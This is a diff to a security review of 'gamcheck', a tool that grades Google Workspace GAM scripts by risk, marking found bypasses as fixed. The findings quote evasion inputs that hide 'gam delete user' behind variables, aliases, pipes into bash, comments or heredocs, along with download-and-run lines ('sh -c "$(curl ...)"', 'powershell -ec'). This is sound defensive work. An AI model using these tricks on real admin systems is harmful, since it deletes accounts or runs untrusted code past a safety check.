@@ -455,13 +455,15 @@ Severity convention for this tool: an under-warning (READ-ONLY or CHANGES printe
 
 ## C1. Critical
 
-### CHK-01 `[ ]` Paste mode leaves the rest of a multi-line paste in the terminal, and the shell runs it after gamcheck exits
+### CHK-01 `[x]` Paste mode leaves the rest of a multi-line paste in the terminal, and the shell runs it after gamcheck exits
+- Done (`73439ef`): lines arriving within 1 s of the blank line and a last line without Enter are checked, the rest is flushed; a paste pausing over 1 s still reaches the shell.
 - Severity Critical. CONFIRMED on a Linux pty by the reviewer; PLAUSIBLE and most likely on Windows (no readline, the console delivers lines one at a time and cmd.exe reads the leftovers; the README's Windows instructions tell the user to "paste anyway" when Windows warns about several lines).
 - Where: `read_paste` 2047-2084; the loop at 2074-2082 stops at the first blank line after some input.
 - What happens: a paste containing a blank line is cut at the blank line (documented), but the unread lines stay in the tty input buffer and the shell reads them when gamcheck returns. Reproduction (pty running `bash --norc -i`, then `python3 gamcheck.py`, then one paste of `gam print users` / blank / `echo PASTED-TAIL-RAN; gam delete user bob@example.com` / blank): gamcheck prints `VERDICT: READ-ONLY`, then the shell prompt shows `echo PASTED-TAIL-RAN; gam delete user bob@example.com` and runs it. On an admin workstation `gam` exists and the delete runs under a green verdict. gamcheck does not enable bracketed paste (no `ESC[?2004h` in its output); with GNU readline 8.1+ the whole block arrives as one `input()` string, so behaviour differs by platform, and `ttypaste.py` simulates typing rather than a terminal paste so it cannot see this.
 - Fix: after the terminating blank line, drain pending input (POSIX: `select` or `termios.tcflush(fd, TCIFLUSH)`; Windows: `msvcrt.kbhit()`/`getwch()` loop or `FlushConsoleInputBuffer`), and either check the drained lines too or print a loud "N more pasted lines were discarded" warning; consider reading until a short idle timeout instead of a blank line when stdin is a tty. Document the behaviour until fixed.
 
 ### CHK-02 `[x]` A `#` inside a word truncates the rest of the line
+- Done (`df9a835`): comments found by the checker, not shlex.
 - Severity Critical. CONFIRMED (coordinator reproduced).
 - Where: `_tokenise` 1014 `lex.commenters = '' if lang == 'batch' else '#'`.
 - What happens: shlex in posix mode starts a comment at any unquoted `#`, even mid-word; bash only at the start of a word. `$#`, `${#VAR}`, `${#ARR[@]}` and `word#` all cut the line. Each of these prints READ-ONLY with a `gam info domain` above it:
@@ -478,6 +480,7 @@ Severity convention for this tool: an under-warning (READ-ONLY or CHANGES printe
 ## C2. High (under-warnings)
 
 ### CHK-03 `[x]` A command whose program is a variable the checker does not know is silently ignored, not CANNOT TELL
+- Done (`4098cc2`): unresolved program variable reads CANNOT TELL.
 - CONFIRMED (coordinator reproduced the first form). `_gam_position` 1453-1475 returns None and `_gam_hidden` 1401-1414 returns False, so the segment produces no finding. README: "Commands put together while the script runs ... come out as CANNOT TELL, never as READ-ONLY". All print READ-ONLY with a read-only gam line above:
   ```
   BIN="$(which gam)"; $BIN delete user bob@example.com            (shell)
@@ -491,21 +494,26 @@ Severity convention for this tool: an under-warning (READ-ONLY or CHANGES printe
 - Fix: when a segment's first non-assignment token is a variable (or `& $var`) that is not a known gam variable, emit CANNOT TELL "runs a program named by a variable"; treat assignments whose value contains `command -v gam`, `which gam`, `Get-Command gam`, `Join-Path ... gam.exe` or `%~dp0gam.exe` as gam variables.
 
 ### CHK-04 `[x]` `%~dp0gam.exe` in a batch file is not recognised as gam
+- Done (`4098cc2`): %~dp0gam.exe read as gam.
 - CONFIRMED (coordinator reproduced). `_gam_name` 958-972 splits on `[\\/]` and is left with `%~dp0gam.exe`; after `.exe` is stripped, `%~dp0gam` is not in `GAM_NAMES`. `%~dp0\gam.exe` works. `%~dp0gam.exe delete user bob@example.com` prints READ-ONLY. This is the standard "gam next to this script" idiom in `.bat` files.
 
 ### CHK-05 `[x]` Text piped into a shell is not reported
+- Done (`453b6dd`): piped text reads CANNOT TELL.
 - CONFIRMED (coordinator reproduced). 1339-1349: an echo/printf segment is exempt from `_gam_hidden`, and the `| bash` segment has no script argument so `_script_path` (1436-1437) returns None. `printf "gam delete user bob@example.com\n" | bash` under `gam info domain` prints READ-ONLY. The existing floor case `echo gam delete user x@example.com | sh` (`test_gamcheck.py:183`) passes only because the fixture has no other gam line, so the "no gam commands found" fallback yields CANNOT TELL; add one read-only line and it is READ-ONLY. README says `bash -c "gam ..."` is CANNOT TELL.
 - Fix: when a pipeline ends in a shell runner (`sh|bash|zsh|pwsh|powershell|cmd`, also `xargs ... sh -c`) with no script file, report CANNOT TELL.
 
 ### CHK-06 `[x]` A comment ending in `\` (bash) or a backtick (PowerShell) swallows the next line
+- Done (`df9a835`): a comment never continues.
 - CONFIRMED (coordinator reproduced). `_logical_lines` 984-1001, line 994 joins any line ending in the continuation character; comments do not continue in bash or PowerShell. `# remove the leaver, see ticket \` followed by `gam delete user bob@example.com` prints READ-ONLY; so does a Windows path at the end of a comment (`# output goes to C:\GAM\`) and a PowerShell comment ending in a backtick. Batch `rem ... ^` really does continue in cmd.exe, so batch is right as it stands.
 - Fix: never join when the physical line's first non-blank character is `#` (shell, PowerShell, gambatch).
 
 ### CHK-07 `[x]` GAM batch files have no line continuation, but the checker joins them
+- Done (`df9a835`): batch files read one command per line.
 - CONFIRMED against the GAM 7.48.20 source (`doBatch` reads one command per physical line with `shlex.split(line)`); coordinator reproduced. `_logical_lines` 988 gives `gambatch` a `\` continuation, so a `.txt` with `gam print users \` followed by `gam delete user bob@example.com` prints READ-ONLY while GAM runs both lines.
 - Fix: no continuation character for `gambatch`.
 
 ### CHK-08 `[x]` Wrapper-function detection stops at the first `}` and ignores subshell bodies
+- Done (`85f7182`): wrappers found by brace matching.
 - CONFIRMED (coordinator reproduced). 1499: the regex body `[^}]*` ends at the `}` of `${1}` or `${GAM:-gam}`, so the function is not registered, while its `gam "$@"` line is still skipped at 1356 as "the body of a wrapper function". Call sites are then never checked:
   ```
   g() {
@@ -517,14 +525,17 @@ Severity convention for this tool: an under-warning (READ-ONLY or CHANGES printe
 - Fix: match braces with nesting, accept `( ... )` bodies, and never skip a `gam "$@"` line whose enclosing function was not registered.
 
 ### CHK-09 `[x]` Alias chains and aliases with arguments are lost
+- Done (`85f7182`): alias chains resolved.
 - CONFIRMED (coordinator reproduced). 1492-1494 resolves one level with empty wrapper sets and drops the alias's own words after the first. `alias g7="gam"; alias zap="g7 delete"; g7 info domain; zap user bob@example.com` prints READ-ONLY; `alias zap="gam delete"; zap user bob@example.com` gives CANNOT TELL "incomplete gam command".
 - Fix: resolve aliases iteratively and keep the alias's trailing words as a prefix to the call's arguments.
 
 ### CHK-10 `[x]` Mode-word logic ignores where the assignment sits
+- Done (`fb95c3f`): mode assignment position respected; xargs/parallel judged whole.
 - CONFIRMED (coordinator reproduced through a `bash x.sh check` runner line). `_mode_scope` 1028-1230 resolves `MODE=$1` wherever it appears, then evaluates every test with that value. A script that tests `$MODE` first and assigns `MODE=$1` afterwards prints READ-ONLY with "mode read from the arguments: MODE='check'", while bash tests an empty MODE and runs the delete. `test_modes` covers function ordering but not top-level ordering. Related (Medium): `xargs bash rb.sh < modes.txt` applies the `${1:-check}` default and prints READ-ONLY because `follow_script` (946) takes argv from the segment only.
 - Fix: an assignment that appears after any test of the same name sets `modes[name] = None`.
 
 ### CHK-11 `[x]` Python: exec entry points rebound through assignment, `partial`, `getattr`, star import or `os.exec*` are missed
+- Done (`756eeba, 4fe2559, 5388a54`): rebinding, partial, getattr, star import, os.exec*, scopes and chains followed.
 - CONFIRMED (coordinator reproduced the first form). `_name` 1646-1652 resolves import aliases only; `EXEC_CALLS` 1555-1558 has `execv`/`execvp` but not `execl`/`execlp`/`execle`/`spawnl*`/`posix_spawn`; `_argument_lists` ignores lists whose first element is `gam`. Each with a read-only call above prints READ-ONLY:
   ```
   run = subprocess.run; run(["gam", "delete", "user", "bob@example.com"])
@@ -538,32 +549,38 @@ Severity convention for this tool: an under-warning (READ-ONLY or CHANGES printe
 ## C3. Medium
 
 ### CHK-12 `[x]` `sh -c "$(curl ...)"` and `bash <(curl ...)` are not SUSPICIOUS
+- Done (`453b6dd`): download-and-run reads SUSPICIOUS.
 - CONFIRMED. The regex at 291 needs a pipe. `sh -c "$(curl -fsSL https://example.com/install.sh)"` is READ-ONLY (with `gam info domain`); `bash <(curl -s https://example.com/x.sh)` is CANNOT TELL worded "runs https://example.com/x.sh, which was not provided" because the URL is taken as a script path. README: "runs hidden or downloaded code" is SUSPICIOUS.
 
 ### CHK-13 `[x]` `powershell -ec <base64>` and `-encoded` are not flagged
+- Done (`453b6dd`): -ec and every -EncodedCommand prefix read SUSPICIOUS.
 - CONFIRMED. 293 `-e(?:nc|ncodedcommand)?\s+` misses `-ec`, `-encoded`, `-ea`; the base64 is then taken as a script name by `_script_path` (1436) and the line reads "runs SQBFAFgA..., which was not provided". Fix the regex and make `_script_path` return None when a `-e*` switch follows `powershell`/`pwsh`.
 
-### CHK-14 `[ ]` Quadratic time on a long token (a hang, not a crash)
+### CHK-14 `[x]` Quadratic time on a long token (a hang, not a crash)
+- Done (`6e7ddba`): long plain runs bypass shlex; 5 MB in under 2 s.
 - CONFIRMED (measured). `_tokenise` 1005-1020: shlex builds `self.token += nextchar`; 80k characters take 0.13 s, 160k take 0.47 s (x3.6 per doubling), a 1 MB line about 20 s, a 5 MB line did not finish in 120 s. A long `users a,b,c,...` list or a base64 blob stalls a pre-commit hook or the release gate. Fix: cap token length (treat tokens over about 64 KB as opaque `Dyn`) or pre-split on whitespace outside quotes.
 
-### CHK-15 `[ ]` Paste mode has no exception guard; a checker exception exits 1, the CHANGES code
+### CHK-15 `[x]` Paste mode has no exception guard; a checker exception exits 1, the CHANGES code
+- Done (`6e7ddba`): paste mode guarded like file mode; count_rows catches csv.Error/OSError.
 - CONFIRMED on 3.11 and 3.13. 2109-2120 calls `checker.check_text(...)` without the `except Exception` that file mode has at 2132. A `data2.csv` in the current folder with a 200 000-character field plus a pasted `gam csv data2.csv gam delete user ~email` gives a `_csv.Error: field larger than field limit` traceback and exit 1; the same file in file mode gives "gamcheck could not read this script" CANNOT TELL, exit 2. The same path fires for a `PermissionError` on any followed batch file, script or CSV (`follow_batch` 911, `follow_script` 927, `count_rows` 384). Fix: the same try/except in the paste branch; in `count_rows` catch `csv.Error`/`OSError` (or raise `csv.field_size_limit`).
 
-### CHK-16 `[ ]` An embedded Python heredoc with a list-form subprocess call is invisible
+### CHK-16 `[x]` An embedded Python heredoc with a list-form subprocess call is invisible
+- Done (`6e7ddba, 45fe4e7`): python stdin heredoc read as Python beside the shell reading.
 - CONFIRMED. For `python3 - <<'EOF'` the `-` is filtered as an option so nothing is reported, and the heredoc body is read as shell, where `subprocess.run(["gam", "delete", "user", "bob@example.com"])` tokenises to a bracketed list with no `gam` run. Prints READ-ONLY with `gam info domain` above (the `os.system("gam ...")` string form does give CANNOT TELL). Fix: `python* -`/`bash -s` with a heredoc gives CANNOT TELL, or hand the heredoc body to the Python reader.
 
 ## C4. Low
 
 - [x] **CHK-17** `test_adversarial`'s floor case `echo gam delete user x@example.com | sh` (`test_gamcheck.py:183`) passes for the wrong reason (CHK-05); add a read-only line to it and it fails.
-- **CHK-18** `blind_run.py:61` exits 1 only on under-warnings and crashes; a case expecting CANNOT TELL that comes back READ-ONLY is classed "over/other" (48-49), so a regression on `gam batch commands.txt` or `gam batch -` would not fail the release gate.
-- **CHK-19** `developers/local-samples/` is not in `.gitignore` although the README says it is "never shipped"; `git archive` ships tracked files only, so it takes a `git add -A` to leak, but the test suite creates the folder.
-- **CHK-20** `gamx` is accepted by `fetch_group_corpus.py`'s regex but not in `GAM_NAMES` (258): a script using only `gamx` reads "no gam commands found".
-- **CHK-21** Over-warnings worth trimming: `gam print users query "todrive"` is CHANGES (834 checks `words`, not `flags`); `gam sync device json x assigntype user preview` and `gam update group x delete member all users preview` are DESTRUCTIVE because `user`/`users` are value keywords that swallow `preview` in `_flags` (871); `gam user x sync groups addonly` is DESTRUCTIVE (first word skipped as the target); `Start-Process -FilePath gam -ArgumentList "..."` is worded "not a command GAM7 recognises ('-ArgumentList')" instead of the README's "handed to another program".
-- **CHK-22** Wording: `gam user x delete messages id 1` is described as "dry run, would have: deletes Gmail messages"; GAM 7.48.20 accepts only `ids`, so GAM stops with an error and "dry run" is misleading. Same for `transfer ownership 1abc preview` (preview read as the user).
+- [x] **CHK-18** `blind_run.py:61` exits 1 only on under-warnings and crashes; a case expecting CANNOT TELL that comes back READ-ONLY is classed "over/other" (48-49), so a regression on `gam batch commands.txt` or `gam batch -` would not fail the release gate. Done (`6e7ddba`): expected CANNOT TELL coming back milder now fails the gate (positive control run).
+- [x] **CHK-19** `developers/local-samples/` is not in `.gitignore` although the README says it is "never shipped"; `git archive` ships tracked files only, so it takes a `git add -A` to leak, but the test suite creates the folder. Done (`6e7ddba`): in .gitignore.
+- [x] **CHK-20** `gamx` is accepted by `fetch_group_corpus.py`'s regex but not in `GAM_NAMES` (258): a script using only `gamx` reads "no gam commands found". Done (`45fe4e7`): gamx in GAM_NAMES.
+- **CHK-21** Over-warnings worth trimming: `gam print users query "todrive"` is CHANGES (834 checks `words`, not `flags`); `gam sync device json x assigntype user preview` and `gam update group x delete member all users preview` are DESTRUCTIVE because `user`/`users` are value keywords that swallow `preview` in `_flags` (871); `gam user x sync groups addonly` is DESTRUCTIVE (first word skipped as the target); `Start-Process -FilePath gam -ArgumentList "..."` is worded "not a command GAM7 recognises ('-ArgumentList')" instead of the README's "handed to another program". Partly done (`45fe4e7`): todrive as a query value. Open: the user/users preview and sync groups addonly trims lower verdicts and need GAM 7.48.20 source to confirm; the Start-Process wording.
+- **CHK-22** Wording: `gam user x delete messages id 1` is described as "dry run, would have: deletes Gmail messages"; GAM 7.48.20 accepts only `ids`, so GAM stops with an error and "dry run" is misleading. Same for `transfer ownership 1abc preview` (preview read as the user). Open: wording only, needs GAM 7.48.20 source to confirm.
 - [x] **CHK-23** `asyncio.create_subprocess_exec("gam", "delete", ...)` and positional `subprocess.Popen("gam", ...)` give "gam with no arguments visible" (`_exec_argv` 1753 reads `args[0]` only). CANNOT TELL, so safe, but easily DESTRUCTIVE.
-- **CHK-24** A directory passed as the script prints "file not found" (exit 2 is right). README table lists `.txt`; `.gam` is also read (1283).
+- [x] **CHK-24** A directory passed as the script prints "file not found" (exit 2 is right). README table lists `.txt`; `.gam` is also read (1283). Done (`45fe4e7`): a folder says so; the README .gam note is in the docs sweep.
 
 ### CHK-T01 `[ ]` Fixtures and tests to add
+- Partly done: every listed case and every later fix is an inline test in `test_gamcheck.py` (`AUDIT_2026_11`, `test_paste`, `test_crash_is_cannot_tell`, timing checks). Open: separate files under `developers/fixtures/`; writing them was blocked by the osh-client-guard hook (file text with lines starting `gam`), so it waits for Paul.
 - `$#` on a line with a command; a comment ending in `\`; a `.txt` batch file with a trailing `\`; `%~dp0gam.exe`; `run = subprocess.run`; `sh -c "$(curl ...)"`; assignment-after-test mode script; a variable-named program; `printf ... | bash` alongside a read-only line; a paste-mode crash regression like `test_crash_is_cannot_tell`; a long-token time bound.
 
 ## C5. Verified OK
